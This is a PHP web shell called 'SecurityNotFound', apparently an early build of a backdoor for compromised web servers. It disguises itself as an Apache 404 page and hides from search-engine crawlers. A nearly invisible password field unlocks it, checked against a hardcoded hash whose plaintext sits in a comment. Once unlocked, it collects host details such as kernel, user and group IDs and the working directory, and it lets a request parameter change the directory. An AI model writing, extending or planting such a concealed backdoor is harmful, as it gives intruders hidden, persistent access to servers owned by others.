<?php

  /* Metadata
  >>>>>>>>>>>>>>>>> */
  define('__NAME__', 'SecurityNotFound');
  define('__AUTHOR__', '@CosasDePuma');

  /* Variables
  >>>>>>>>>>>>>>>>> */
  $passphrase = '136c757bdd877848762c248e58252935'; // cosasdepuma

  $theme = array(
    "clouds" => "#ecf0f1",
    "midnight" => "#2c3e50",
  
    "yellow" => "#ffe066",
    "dblue" => "#247ba0",
    "lblue" => "#70c1b3",
  );

  /* Headers
  >>>>>>>>>>>>>>>>> */
  header('HTTP/1.0 404 Not Found');
  header('X-Powered-By: Unicorns and kitties <3');

  /* Robots
  >>>>>>>>>>>>>>>>> */
  $robots = array(
    'Google', 'Yandex', 'MSNBot', 'Slurp', 'Rambler', 'ia_archiver'
  );

  foreach($robots as $robot)
    if(strpos($_SERVER['HTTP_USER_AGENT'],$robot) !== false)
      exit;

  /* Functions
  >>>>>>>>>>>>>>>>> */
  function InformationGathering() {
    $GLOBALS['INFO'] = array(
      'KERNEL' => substr(@php_uname('s'), 0, 120),
      'OS' => (strtolower(substr(PHP_OS,0,3)) == "win") ? "win" : "nix",
      'RELEASE' => substr(@php_uname('r'), 0, 120),
      'SHELL_CWD' => (isset($_POST['wd'])) ? $_POST['wd'] : getcwd(),
      'SHELL_ROOT' => getcwd()
    );
    @chdir($GLOBALS['INFO']['SHELL_CWD']);
    if($GLOBALS["INFO"]["OS"] == "win") {
      $GLOBALS["INFO"]["SHELL_ROOT"] = str_replace("\\", "/", $GLOBALS["INFO"]["SHELL_ROOT"]);
      $GLOBALS["INFO"]["SHELL_CWD"] = str_replace("\\", "/", $GLOBALS["INFO"]["SHELL_CWD"]);
    }
    if( $GLOBALS["INFO"]["SHELL_CWD"][strlen($GLOBALS["INFO"]["SHELL_CWD"])-1] != '/' ) 
      $GLOBALS["INFO"]["SHELL_CWD"] .= '/'; 

    if(function_exists('posix_getegid')) {
      $GLOBALS["INFO"]["UID"] = @posix_getpwuid(@posix_geteuid());
      $GLOBALS["INFO"]["GID"] = @posix_getgrgid(@posix_getegid());
      $GLOBALS["INFO"]["USER"] = $GLOBALS["INFO"]["UID"]['name'];
      $GLOBALS["INFO"]["UID"] = $GLOBALS["INFO"]["UID"]['uid'];
      $GLOBALS["INFO"]["GROUP"] = $GLOBALS["INFO"]["GID"]['name'];
      $GLOBALS["INFO"]["GID"] = $GLOBALS["INFO"]["GID"]['gid'];
    } else {
      $GLOBALS["INFO"]["USER"] = @get_current_user();
      $GLOBALS["INFO"]["UID"] = @getmyuid();
      $GLOBALS["INFO"]["GID"] = @getmygid();
      $GLOBALS["INFO"]["GROUP"] = "?";
    }
  }

  /* Web pages
  >>>>>>>>>>>>>>>>> */
  function ApacheNotFound() {
    ?>
  
    <h1>Not Found</h1>
    <p>The request URL <?=dirname($_SERVER['REQUEST_URI'])?> was not found on this server.</p>
    <hr>
    <address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>

    <center>
      <form method="post">
        <input style="margin:0;background-color:#fff;border:0px" type="password" name="passwd">
      </form>
    </center>

    <?php exit;
  }

  function Head() {
    ?>

    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta http-equiv="X-UA-Compatible" content="ie=edge">
      <title>404 Security Not Found</title>
      <style>
        * { margin: 0px; padding: 0px; box-sizing: border-box; }
        body { background: #e9e9e9; margin: 10px; }
        .container { background: #ccc; width: 90%; max-width: 1000px; margin: auto;
          display: flex; flex-flow: row wrap; }
        header { background: #2c3e50; width:100%; padding: 20px;
          display:flex; justify-content: space-between; align-items: center; flex-flow: row wrap; }
        header .title { color: #fff; text-align: center; text-decoration: none; width: 40% }
        header nav, footer { width: 60%; display: flex; flex-wrap: wrap; align-items: center; }
        header nav span, footer .cwd span { background: #c0392b; color: #fff; margin-left: 5px; font-size: 14px; text-align: center; text-decoration: none; padding: 10px;
          flex: 2; border: #fff solid 1px; }
        header nav span:nth-child(1) { flex: 1 }
        .main { background: #fff; padding: 20px;
          flex: 1 1 70%; }
        .main article { margin-bottom: 20px; padding-bottom: 20px; border-bottom: #000 solid 1px; }
        .main article:nth-child(2) { margin-bottom: 0; padding-bottom: 0; border-bottom: none; }
        aside { background: #e67e22; padding: 20px;
          flex: 1 1 30%; display: flex; flex-wrap: wrap; justify-content: flex-start; flex-direction: column; }
        aside .widget { background: #d35400; height: 150px; margin: 20px; }
        footer { background: #2c3e50; width: 100%; padding: 20px;
          display: flex; flex-wrap: wrap; justify-content: space-between; }
        footer .exit { background: #e67e22; border: #fff solid 1px; }
        footer .exit a { color: #fff; text-decoration: none; padding: 6px 20px; display: inline-block }
      </style>
    </head>

    <?php
  }

  function Body() {
    ?>

    <body>
      <div class="container">
        <header>
          <div class="title">
            <h2>Security Not Found</h2>
          </div>
          <nav>
            <span>OS: <?=$GLOBALS['INFO']['OS']?></span>
            <span>User: <?=$GLOBALS['INFO']['USER']." (".$GLOBALS['INFO']['UID'].")"?></span>
            <span>Group: <?=$GLOBALS['INFO']['GROUP']." (".$GLOBALS['INFO']['GID'].")"?></span>
          </nav>
        </header>

        <section class="main">
          <article>
            <h2>Lorem</h2>
            <p>
              Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy
              text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen
              book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially
              unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages,
              and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.
            </p>
          </article>
          <article>
            <h2>Lorem</h2>
            <p>
              Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy
              text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen
              book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially
              unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages,
              and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.
            </p>
          </article>
        </section>

        <aside>
          <div class="widget">
          </div>
          <div class="widget">
          </div>
        </aside>

        <footer>
          <section class="cwd">
            <span href="#">Cwd: <?=$GLOBALS['INFO']['SHELL_CWD']?></span>
            <span href="#">Kernel: <?=$GLOBALS['INFO']['KERNEL']." (".$GLOBALS['INFO']['RELEASE'].")"?></span>
          </section>

          <div class="exit">
            <a href="?out">Close</a>
          </div>
        </footer>
      </div>
    </body>

    <?php
  }

  function Shell() {
    Head();
    Body();
  }

  /* Workflow
  >>>>>>>>>>>>>>>>> */
  if(isset($_GET['out'])) {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    header("Refresh:0; url=" . explode('?', $_SERVER[REQUEST_URI])[0]);
    die();
  }

  if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if(empty($passphrase) || (isset($_POST['passwd']) && (md5(md5(md5($_POST['passwd']))) == $passphrase))) {
      $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
      ApacheNotFound();
    }
  }
  
  InformationGathering();
  Shell();
?>